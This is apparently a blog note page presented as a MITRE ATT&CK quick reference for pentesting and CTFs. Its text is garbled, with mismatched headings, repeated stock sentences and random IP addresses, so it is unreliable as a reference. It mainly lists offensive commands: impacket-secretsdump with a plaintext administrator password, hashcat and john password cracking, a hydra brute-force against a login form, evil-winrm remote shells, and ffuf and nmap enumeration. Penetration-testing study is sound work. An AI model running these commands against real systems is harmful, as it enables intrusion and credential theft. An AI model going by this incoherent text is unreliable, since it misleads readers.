---
TitleSEO: "MITRE ATT&CK Framework Reference | ZureFX"
TitlePost: "MITRE ATT&CK Framework Reference"
Author: "ZureFX"
Description: "Personal notes on MITRE ATT&CK Framework Reference. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, persistence, linux, enumeration, lateral movement, privilege escalation"
URL: "https://zurefx.github.io/notes/note-mitre-att&ck-framework-reference-485.html"
URL_IMAGES: ""
Date: "2024-01-27"
Tags: "DFIR, Persistence, Linux, Enumeration, Lateral Movement, Privilege Escalation"
Section: "notes"
Lang: "en"
main_img: "note-mitre-att&ck-framework-reference-485"
Permalink: "/notes/note-mitre-att&ck-framework-reference-485.html"
BtnLabel: "Read Notes"
Pick: 0
---
## msfvenom

### Subdomain Takeover

- `XXE`
- `IDOR`
- `Weak Service Permissions`
- `SQL Injection`
- `SSRF`

> **Note:** Docker Escape was identified as the primary attack vector in this scenario.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.223.85
```

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

## SMTP

### metasploit

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.127.183.35 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.59.121.73/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.56.97.96 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

## AlwaysInstallElevated

### Java

> **Note:** Silver Ticket was identified as the primary attack vector in this scenario.

```powershell
evil-winrm -i 10.50.232.125 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p8443,1433,389 10.32.164.98 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.97.9.111
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit.

## GPP Password

### crackmapexec

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.45.224.145
```

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality.
